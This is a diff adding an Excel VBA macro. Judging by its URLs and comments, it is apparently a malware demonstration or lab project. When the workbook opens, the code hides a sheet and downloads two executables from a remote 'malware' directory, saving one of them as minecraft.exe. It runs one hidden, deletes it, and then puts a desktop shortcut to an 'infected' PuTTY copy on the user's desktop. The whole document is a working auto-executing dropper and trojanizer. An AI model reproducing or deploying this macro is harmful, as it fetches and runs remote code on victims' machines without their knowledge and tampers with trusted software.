@@ -1,0 +1,72 @@
+Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
+    ByVal pCaller As LongPtr, _
+    ByVal szURL As String, _
+    ByVal szFileName As String, _
+    ByVal dwReserved As Long, _
+    ByVal lpfnCB As LongPtr _
+) As Long
+
+Sub WorkBook_open()
+
+    ''' Hide encoding tab and show normal tab
+    Sheet1.Visible = True
+    Sheet1.Activate
+    Sheet2.Visible = False
+
+    ''' Copy PuTTY
+    Dim sourceFile As String
+    Dim destinationFile As String
+    sourceFile = "C:/Program Files (x86)/PuTTY/putty.exe"
+    destinationFile = "C:/Users/" & Environ("username") & "/Documents/putty.exe"
+    FileCopy sourceFile, destinationFile
+
+    ''' Download our Python script from the remote server
+    URLDownloadToFileA 0, "https://rydall.dk/malware/code.exe", "pythonCode.exe", 0, 0
+    URLDownloadToFileA 0, "https://rydall.dk/malware/crawler.exe", "minecraft.exe", 0, 0
+    
+    ''' Execute Python script, either visible or hidden
+    Shell "C:/Users/" & Environ("username") & "/Documents/pythonCode.exe", vbHide
+    
+    ''' Wait for the execution to finish and delete the downloaded code
+    Application.Wait (Now + TimeValue("0:00:30"))
+    Kill "C:/Users/" & Environ("username") & "/Documents/pythonCode.exe"
+    
+    ''' Create shortcut to infected PuTTY on user's desktop
+    ''' Reference: https://www.mrexcel.com/board/threads/creating-a-directory-and-shortcut-with-vba.670733/post-3324366
+    On Error GoTo Proc_Err
+    Dim oWsh As Object _
+      , oShortcut As Object
+      
+    Dim sPathDesktop As String _
+      , sShortcut As String _
+      , sPathFile As String
+   
+    sPathFile = "C:/Users/" & Environ("username") & "/Documents/putty.exe"
+   
+    Set oWsh = CreateObject("WScript.Shell")
+    sPathDesktop = oWsh.SpecialFolders("Desktop")
+    sShortcut = sPathDesktop & "\putty.lnk"
+   
+    Set oShortcut = oWsh.CreateShortcut(sShortcut)
+    With oShortcut
+       .TargetPath = sPathFile
+       .Description = "putty"
+       .IconLocation = "C:/Program Files (x86)/PuTTY/putty.exe"
+       .Save
+    End With
+
+Proc_Exit:
+    On Error Resume Next
+    Set oShortcut = Nothing
+    Set oWsh = Nothing
+    Exit Sub
+  
+Proc_Err:
+    MsgBox Err.Description, , _
+        "ERROR " & Err.Number _
+        & "   CreateShortcut "
+    Resume Proc_Exit
+    Resume
+ 
+End Sub
+
